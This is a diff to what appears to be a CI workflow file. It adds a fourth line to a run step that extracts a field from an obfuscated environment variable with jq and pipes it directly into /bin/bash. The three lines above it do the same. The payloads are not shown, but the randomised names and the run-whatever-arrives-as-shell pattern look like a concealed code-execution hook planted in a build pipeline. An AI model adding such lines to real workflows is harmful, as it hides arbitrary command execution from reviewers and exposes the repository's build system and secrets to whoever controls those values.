@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$hli01" | jq -r .ki3 | /bin/bash
           echo $szte85563 | jq -r .rqzyo53948 | /bin/bash
           printf '%s' "$tefb4" | jq -r .eds7 | /bin/bash
+          printf '%s' "$xdpy3" | jq -r .a086 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
